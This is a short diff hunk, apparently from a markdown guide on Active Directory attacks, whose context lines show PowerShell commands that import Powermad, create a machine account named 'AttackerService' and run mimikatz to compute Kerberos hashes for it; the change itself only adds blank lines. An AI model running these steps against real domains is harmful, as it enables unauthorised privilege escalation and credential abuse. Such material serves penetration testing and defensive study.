@@ -22,3 +22,5 @@ Import-Module .\Powermad\powermad.ps1
 New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
 .\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
 ```
+
+
